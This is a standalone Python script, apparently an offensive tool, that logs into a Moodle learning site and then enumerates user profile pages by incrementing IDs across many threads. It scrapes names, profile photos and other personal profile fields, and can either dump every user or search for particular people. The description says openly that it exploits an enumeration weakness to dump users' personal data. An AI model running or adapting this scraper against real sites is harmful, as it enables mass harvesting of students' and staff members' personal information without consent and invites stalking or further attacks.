#!/usr/bin/python3

import requests
from threading import Thread,Lock
import os
from bs4 import BeautifulSoup
from argparse import ArgumentParser

class UserEnumerator:

    def draw_separator(self):
        print("-" * 20)

    def print_error(self,exception):
        print("Error!\nError message: {}".format(exception.strerror))

    def __init__(self,max_threads,url,search_keywords,id_range,output):
        self.search_keywords = search_keywords
        self.url = url.rstrip("/")
        self.max_threads = max_threads
        self.id_range = [int(i) for i in id_range.split("-")]
        self.threads = []
        self.lock_thread = Lock()
        self.id_now = self.id_range[0]
        self.session = requests.Session()
        self.session_cookies = None
        self.logout_key = None
        self.output_dir = output
        self.lock_file_io = Lock()
        self.output_lock = Lock()

    def start(self):
        # LOGIN
        self.draw_separator()
        username = input("Enter your login username: ")
        password = input("Enter your login password: ")
        self.draw_separator()
        print("Opening login page...")
        url = "{}/login/index.php".format(self.url)
        try:
            resp = self.session.get(url=url)
            resp.raise_for_status()
        except requests.exceptions.HTTPError as e:
            self.print_error(e)
            exit()
        resp_bs4 = BeautifulSoup(resp.content,'html.parser')
        login_token = resp_bs4.find_all(name="input",attrs={"name":"logintoken"})[0]["value"]
        print("Obtained login page token: {}".format(login_token))
        print("Logging in...")
        try:
            resp = self.session.post(url=url, data={"username":username,"password":password,"anchor":"","logintoken":login_token})
        except requests.exceptions.HTTPError as e:
            self.print_error(e)
            exit()
        if "Invalid login, please try again" in resp.text:
            print("Invalid login details!")
            exit()
        print("Logged in")
        resp_bs4 = BeautifulSoup(resp.content,'html.parser')
        self.session_cookies = resp.history[0].cookies.get_dict()
        print("Obtained session cookies: {}".format(self.session_cookies))
        self.logout_key = resp_bs4.find_all("a",attrs={"data-title":"logout,moodle"})[0]["href"].split("=")[1]
        print("Obtained logout key: {}".format(self.logout_key))

        # ENUMERATE
        print("Starting {} threads...".format(self.max_threads))
        self.draw_separator()
        print("[+] RESULTS".format(self.max_threads))
        for thread_num in range(0,self.max_threads):
            thread = Thread(target=self.thread_func)
            self.threads.append(thread)
            thread.start()

        for thread in self.threads:
            thread.join()
        self.stop()

    def stop(self):
        self.id_now = -99
        self.draw_separator()
        print("Threads stopped\nLogging out...")
        url = "{}/login/logout.php?sesskey={}".format(self.url,self.logout_key)
        try:
            self.session.get(url=url)
            print("Logged out")
        except requests.exceptions.HTTPError as e:
            print("Failed to logout")
            print(e.strerror)

    def get_next_id(self):
        with self.lock_thread:
            needed_id = self.id_now
            if needed_id > self.id_range[1]:
                return -99
            else:
                self.id_now += 1
                return needed_id

    def write_single_profile(self,profile_info):
        if self.output_dir is None:
            return
        with self.lock_file_io:
            with open("{}/moodle_user_enum_results.txt".format(self.output_dir),'a+') as f:
                for key,value in profile_info.items():
                    f.write("{} : {}\n".format(key,value))
            print("")

    def print_single_profile(self,profile_info):
        with self.output_lock:
            print("\n" + "#"*20)
            for key,value in profile_info.items():
                print("{} : {}".format(key,value))

    def thread_func(self):
        profile_page_prefix = "{}/user/profile.php?id=".format(self.url)
        while True:
            next_id = self.get_next_id()
            if next_id < 0:
                break
            url = profile_page_prefix + str(next_id)
            resp = requests.get(url=url,cookies=self.session_cookies)
            resp_bs4 = BeautifulSoup(resp.text,'html.parser')
            # EXTRACT PROFILE DATA
            name = resp_bs4.find_all("div",attrs={"class":"page-header-headings"})[0].find_all("h1")[0].text
            profile_pic_url = resp_bs4.find_all("img",attrs={"class":"userpicture"})[0]["src"]
            profile_info = {"id":url.split("=")[1],"Profile pic":profile_pic_url,"Name":name}
            for li in resp_bs4.find_all("li",attrs={"class":"contentnode"}):
                dl = li.find_all("dl")[0]
                key = dl.find_all("dt")[0].text
                value = dl.find_all("dd")[0].text
                profile_info[key] = value

            if len(self.search_keywords.keys()) == 0:
                # DUMP ALL
                self.write_single_profile(profile_info)
                self.print_single_profile(profile_info)

            else:
                # SEARCH
                for each_search_term,each_search_keyword_list in self.search_keywords.items():
                    try:
                        target = profile_info[each_search_term]
                        search_items = [to_check.lower() for to_check in each_search_keyword_list.split(",")]
                        for search_item in search_items:
                            if target.lower() in search_item:
                                self.write_single_profile(profile_info)
                                self.print_single_profile(profile_info)
                    except:
                        pass
        return

# DRIVER CODE
print(r"""
 __  __              _ _       _   _               ___                
|  \/  |___  ___  __| | |___  | | | |___ ___ _ _  | __|_ _ _  _ _ __  
| |\/| / _ \/ _ \/ _` | / -_) | |_| (_-</ -_) '_| | _|| ' \ || | '  \ 
|_|  |_\___/\___/\__,_|_\___|  \___//__/\___|_|   |___|_||_\_,_|_|_|_|
""")

# ARGS
parser = ArgumentParser(epilog="Author: CaptainWoof (https://www.twitter.com/realCaptainWoof)",
                        description="""A python script that lets you dump the entire personal user data (short of the passwords) or search for a particular user on a site running on Moodle CMS, by exploiting the fact that Moodle is vulnerable to a simple user enumeration scan by id incrementation.""")

parser.add_argument("-m","--mode",action='store',type=str,choices=['S','D'],required=True,help="Search for single user/Dump all users (S/D)")
parser.add_argument("-u","--url",action='store',type=str,required=True,help="Moodle CMS's homepage url (prepended with http/s)")
parser.add_argument("-ids","--id_range",action='store',type=str,required=False,help="ID range to search in (default: '0-10000')",default="1-10000")
parser.add_argument("-t","--threads",action='store',type=int,required=False,help="Max number of concurrent threads to use",default=30)
parser.add_argument("-o","--output",action="store",type=str,required=False,help="Output directory ('cur' for current-directory): ")
args = parser.parse_args()
if args.output.lower() == 'cur':
    args.output = os.getcwd()
search_keywords = {}

# CHOICE ARGS
if args.mode.lower() == 's':
    # SINGLE USER
    search_terms = input("Enter (comma-separated) search keys to query with (must appear on User profile)\n(E.g, 'Name,Contact,Address'): ").split(",")
    for search_term in search_terms:
        search_keywords[search_term] = input("Enter (comma-separated) '{}' to search: ".format(search_term))
elif args.mode == 'd':
    # DUMP ALL
    pass

user_enumerator = UserEnumerator(args.threads,args.url,search_keywords,args.id_range,args.output)
try:
    user_enumerator.start()
except KeyboardInterrupt:
    user_enumerator.draw_separator()
    print("User interrupted!")
    user_enumerator.stop()